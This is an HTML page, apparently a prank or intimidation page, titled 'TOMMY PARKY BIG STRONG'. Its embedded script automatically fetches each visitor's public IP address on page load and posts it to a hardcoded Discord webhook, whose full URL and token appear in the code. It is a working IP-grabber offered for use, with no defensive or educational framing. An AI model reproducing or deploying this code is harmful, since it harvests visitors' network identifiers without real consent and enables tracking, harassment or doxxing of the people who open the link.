<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TOMMY PARKY BIG STRONG</title>
    <style>
        /* Add background image */
        body {
            background-image: url('https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.ytimg.com%2Fvi%2FYRRM5BxcZDo%2Fhqdefault.jpg%3Fsqp%3D-oaymwEmCOADEOgC8quKqQMa8AEB-AH-BIAC4AOKAgwIABABGEUgRSh_MA8%3D%26rs%3DAOn4CLC_ux-_lv8ail_sKF8wQvI6teNJSw&f=1&nofb=1&ipt=9750441c0499504839b96ec05175dd9a1394cd3a97a29e9b0a5aa62e8f462c0b');  /* Replace with your image URL */
            background-size: cover;  /* Ensure the image covers the whole background */
            background-position: center;  /* Center the image */
            background-attachment: fixed;  /* Make the background fixed when scrolling */
            color: white;  /* Change text color for better visibility on background */
            font-family: Arial, sans-serif;  /* Set font style */
            margin: 0;
            padding: 0;
            height: 100vh;  /* Make the body cover the full screen height */
        }

        /* Style for the h1 element */
        h1 {
            text-align: center;
            margin-top: 50px;
            font-size: 2em;
        }

        /* Style for the status text */
        #status {
            text-align: center;
            font-size: 1.5em;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Fetching and Sending Your IP Address to UTUBETROLLPOLICE</h1>
    <p id="status">Loading...</p>

    <script>
        // Define the Discord Webhook URL
        const discordWebhookUrl = 'https://ptb.discord.com/api/webhooks/1376131891102748682/V5XxcrZyBUX9_ybZQf92kt8k6IceJJt87k-i6EUatSMLE8Krq1Oqz218_o6URnKbBzeZ';  // Replace with your Discord webhook URL

        // Fetch the user's IP address from ipify
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())  // Parse JSON response
            .then(data => {
                // Get the user's IP address
                const userIp = data.ip;

                // Display IP on the webpage
                document.getElementById('status').textContent = `Your IP Address: ${userIp}`;

                // Create the message payload for Discord
                const payload = {
                    content: `New user IP: ${userIp}`  // The message you want to send to Discord
                };

                // Send the IP to the Discord webhook
                fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)  // Send the payload as JSON
                })
                .then(response => {
                    if (response.ok) {
                        console.log('IP address sent to Discord successfully');
                    } else {
                        console.error('Failed to send IP to Discord');
                    }
                })
                .catch(error => {
                    console.error('Error sending IP to Discord:', error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP address:', error);
                document.getElementById('status').textContent = 'Unable to fetch IP address';
            });
    </script>
</body>
</html>
